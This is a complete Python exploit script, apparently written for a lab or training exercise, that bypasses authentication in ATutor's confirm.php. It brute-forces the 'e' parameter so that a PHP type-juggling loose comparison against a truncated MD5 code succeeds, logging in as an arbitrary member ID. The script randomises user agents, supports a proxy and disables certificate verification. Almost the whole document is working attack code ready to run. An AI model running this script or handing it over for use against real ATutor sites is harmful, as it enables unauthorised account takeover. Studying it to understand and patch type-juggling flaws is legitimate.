#!/usr/bin/python3
import hashlib,string,re,sys
import itertools
import requests
import urllib3
import os
import sys
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 5

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

def get_session(url,headers):
    """
    Required to get a valid cookie session, related to the used User-Agent
    """
    session = requests.Session()
    r = session.get(url=url,headers=headers,timeout=timeout,verify=False)
    return session

def do_type_juggle(url,headers,session,id,code):
    """
    Uses params 'e','id','m' as GET parameters to eventually land in the check for 'auto_login'. POST params 'auto_login','member_id' and 'code' are required for the same call.
    The 'code' param is vulnerable to loose comparisons, based on a 10 chars based MD5 hash. Basically a numerical brute-force on the 'e' value, as the first param being hashed.
    From ATutor/confirm.php
    143 if (isset($_REQUEST['auto_login']))
    144 {
    145     
    146     $sql = "SELECT M.member_id, M.login, M.creation_date, M.preferences, M.language FROM %smembers M WHERE M.member_id=%d";
    147     $row = queryDB($sql, array(TABLE_PREFIX, $_REQUEST["member_id"]), TRUE);
    148 
    149     $code = substr(md5($e . $row['creation_date'] . $id), 0, 10);
    150     
    151     if ($row['member_id'] != '' && isset($_REQUEST['code']) && $_REQUEST['code'] == $code) 
    152     {
    153         $_SESSION['valid_user'] = true;
    ...<SNIP>...
    165         header('Location: '.AT_BASE_HREF.'bounce.php?course='.$_POST['course']);
    """
    data = {'auto_login':'1',
            'member_id':id,
            'code':'0'}
    params = {'e':code,
            'id':'',
            'm':''}
    r = session.post(url=url,headers=headers,data=data,params=params,timeout=timeout,verify=False,allow_redirects=False)
    if r.status_code == 302:
        return True

def gen_code(url,headers,session,id,start,stop):
    """
    Generates a code to guess, based on iterative numbers
    """
    count = 0
    for code in range(start,stop+1):
        print("[*] Sending update request using code " + str(code) + " and id " + id)
        try:
            if do_type_juggle(url,headers,session,id,code):
                print("[+] Auto logged in using code: " + str(code) + "\n")
                exit(1)
        except KeyboardInterrupt:
            keyboard_interrupt()
        count += 1

def main():
    if len(sys.argv) != 5:
        print("[+] Usage: " + sys.argv[0] + " <id> <start> <stop> <url>")
        print("[+] Eg: " + sys.argv[0] + " 1 11511 55555 http://192.168.252.12/atutor/confirm.php")
        sys.exit(-1)

    id = sys.argv[1]
    start = int(sys.argv[2])
    stop = int(sys.argv[3])
    url = sys.argv[4]

    headers = http_headers()

    session = get_session(url,headers)
    gen_code(url,headers,session,id,start,stop)


if __name__ == "__main__":
    main()

